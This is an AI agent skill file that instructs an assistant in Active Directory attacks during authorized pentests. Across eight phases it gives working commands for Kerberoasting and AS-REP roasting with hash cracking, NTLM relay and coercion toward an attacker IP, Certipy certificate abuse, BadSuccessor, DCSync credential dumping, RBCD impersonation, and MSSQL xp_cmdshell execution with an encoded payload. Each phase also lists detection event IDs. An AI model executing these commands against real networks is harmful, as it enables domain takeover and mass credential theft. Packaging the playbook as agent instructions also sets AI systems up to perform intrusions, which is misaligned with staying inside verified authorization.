---
name: active-directory-attack
description: Active Directory attack specialist for authorized pentests — covers BloodHound CE attack-path enumeration, Kerberoasting/AS-REP roasting, NTLM/Kerberos relay (Responder/ntlmrelayx/Coercer), ADCS ESC1-ESC17 abuse via Certipy, dMSA BadSuccessor (CVE-2025-53779), RBCD/delegation abuse, DCSync, MSSQL-to-AD escalation, SCCM exploitation, and OPSEC/detection-pairing per technique. Use when attacking or auditing Active Directory environments. Triggers on: active directory, AD attack, bloodhound, kerberoasting, AS-REP roasting, ADCS, certipy, ESC1, DCSync, NTLM relay, Responder, RBCD, BadSuccessor, impacket.
---

# Skill: active-directory-attack

## Trigger

Fire when the task involves:
- BloodHound CE graph analysis and attack-path enumeration
- Kerberoasting or AS-REP roasting
- NTLM relay attacks (Responder + ntlmrelayx)
- ADCS certificate template abuse (ESC1-ESC17)
- DCSync credential extraction
- Delegation abuse (RBCD, unconstrained, constrained)
- dMSA BadSuccessor (CVE-2025-53779)
- MSSQL xp_cmdshell → AD escalation
- SCCM/MECM exploitation
- Hardened domain operation (credential guard, protected users)

## Instructions

### Phase 1 — BloodHound CE Attack-Path Enumeration

```bash
# Collect data with SharpHound (Windows target)
.\SharpHound.exe -c All --zipfilename loot.zip
# OR BloodHound Python (from Linux)
pip install bloodhound
bloodhound-python -d corp.local -u user -p pass -ns 10.10.10.1 -c all

# Import zip to BloodHound CE (Docker)
docker compose up

# Key Cypher queries (mwnickerson/bloodhound_mcp resource):
# Find all Kerberoastable users
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'krbtgt' RETURN u.name,u.description

# Find AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Shortest path to Domain Admin
MATCH p=shortestPath((n:User {name:"attacker@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# Find DCSync rights
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name,d.name

# Find ADCS templates (ESC1)
MATCH (n:GPO) WHERE n.type = 'Certificate Template' RETURN n.name,n.enrollmentflags,n.ekus
```

### Phase 2 — Kerberoasting

```bash
# impacket (remote, no agent needed)
python3 GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Rubeus (Windows, from compromised host)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP RC4)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# AES-256 (mode 19700)
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt

# OPSEC: request tickets with /nowrap to avoid noisy base64
# Detection: Event ID 4769 (Kerberos service ticket requested) with RC4 encryption
```

### Phase 3 — AS-REP Roasting

```bash
# impacket (remote)
python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.1

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Detection: Event ID 4768 (TGT requested) with no pre-auth
```

### Phase 4 — NTLM Relay (Responder + ntlmrelayx)

```bash
# Step 1: Disable SMB/HTTP in Responder (don't capture, relay instead)
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Step 2: Start Responder to poison LLMNR/NBT-NS
sudo python3 Responder.py -I eth0 -rdwv

# Step 3: ntlmrelayx to relay to target (LDAP for DA, SMB for local admin)
python3 ntlmrelayx.py -tf targets.txt -smb2support -l loot/  # SMB relay
python3 ntlmrelayx.py -t ldap://dc.corp.local -smb2support --escalate-user lowpriv  # LDAP relay

# Step 4: Coerce authentication (if LLMNR quiet)
# Coercer (petitpotam/printerbug/etc.)
python3 Coercer.py coerce -u user -p pass -d corp.local -l attacker_ip -t dc.corp.local

# SMB → LDAP signing bypass: target hosts without LDAP signing
nmap -p 445 --script smb2-security-mode 10.10.10.0/24 | grep "Message signing enabled but not required"

# Detection: Event ID 4624 (logon) type 3 from unexpected source; EID 4648
```

### Phase 5 — ADCS Abuse (Certipy)

```bash
# Install Certipy
pip install certipy-ad

# Enumerate all certificate templates
certipy find -u user@corp.local -p pass -dc-ip 10.10.10.1 -vulnerable

# ESC1 — Enrollee supplies SAN, client auth EKU
certipy req -u user@corp.local -p pass -dc-ip 10.10.10.1 \
  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# ESC4 — Write rights on template (modify to ESC1)
certipy template -u user@corp.local -p pass -dc-ip 10.10.10.1 \
  -template VulnTemplate -save-old
certipy template -u user@corp.local -p pass -dc-ip 10.10.10.1 \
  -template VulnTemplate -configuration Certipy.json

# ESC8 — NTLM relay to ADCS HTTP enrollment endpoint
python3 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Use cert for auth (PKINIT → TGT)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# dMSA BadSuccessor (CVE-2025-53779) — requires write on msDS-ManagedPasswordId
# SharpSuccessor (abelrguezr/hacktricks-skills standalone skill)
.\SharpSuccessor.exe /target:TargetComputer /successor:ControlledDMSA
# OR NetExec:
netexec ldap dc.corp.local -u user -p pass -M badsuccessor -o TARGET=target-computer

# Detection: EID 5136 (attribute modified), EID 5137 (object created) on msDS-ManagedPasswordId
```

### Phase 6 — DCSync

```bash
# impacket (requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
python3 secretsdump.py corp.local/user:pass@dc.corp.local -just-dc

# Mimikatz (Windows)
lsadump::dcsync /domain:corp.local /user:Administrator

# Check who has DCSync rights
python3 bloodyAD.py --host dc.corp.local -d corp.local -u user -p pass get object "DC=corp,DC=local" --attr nTSecurityDescriptor

# Detection: EID 4662 (operation performed on AD object) with GUID for DS-Replication
```

### Phase 7 — RBCD (Resource-Based Constrained Delegation)

```bash
# If you have write rights on target computer's msDS-AllowedToActOnBehalfOfOtherIdentity:
# Step 1: Create fake computer (or use existing controlled computer)
python3 addcomputer.py corp.local/user:pass -dc-ip 10.10.10.1 -computer-name FAKEMACHINE -computer-pass Passw0rd!

# Step 2: Set RBCD on target
python3 rbcd.py corp.local/user:pass -dc-ip 10.10.10.1 \
  -action write -delegate-from FAKEMACHINE$ -delegate-to TargetMachine$

# Step 3: Get service ticket (S4U2Self + S4U2Proxy)
python3 getST.py corp.local/FAKEMACHINE$:Passw0rd! -dc-ip 10.10.10.1 \
  -spn cifs/TargetMachine.corp.local -impersonate administrator

# Step 4: Use ticket
export KRB5CCNAME=administrator.ccache
python3 smbexec.py -k -no-pass TargetMachine.corp.local
```

### Phase 8 — MSSQL → AD Escalation

```bash
# Find MSSQL instances
python3 GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.1 | grep MSSQLSvc

# Connect and check if xp_cmdshell available
python3 mssqlclient.py corp.local/user:pass@10.10.10.100 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -enc <base64_payload>

# Linked server abuse (move between MSSQL instances)
SQL> SELECT * FROM OPENQUERY("LinkedServer", 'SELECT SYSTEM_USER')
SQL> EXEC ('xp_cmdshell ''whoami''') AT "LinkedServer"
```

## References

- ADScanPro/Claude-AD — https://github.com/ADScanPro/Claude-AD (215 stars, MIT)
- hypnguyen1209/offensive-claude — https://github.com/hypnguyen1209/offensive-claude (403 stars, MIT)
- mwnickerson/bloodhound_mcp — https://github.com/mwnickerson/bloodhound_mcp (GPL-3.0)
- blacklanternsecurity/red-run — https://github.com/blacklanternsecurity/red-run (GPL-3.0)
- 26zl/cybersec-toolkit — https://github.com/26zl/cybersec-toolkit (Apache-2.0)
- abelrguezr/hacktricks-skills badsuccessor — CVE-2025-53779
- mukul975/Anthropic-Cybersecurity-Skills — https://github.com/mukul975/Anthropic-Cybersecurity-Skills (Apache-2.0)
- impacket — https://github.com/fortra/impacket (MIT)
- certipy-ad — https://github.com/ly4k/Certipy
- Source report: ad-dominus-deep-research-2026-10-27.md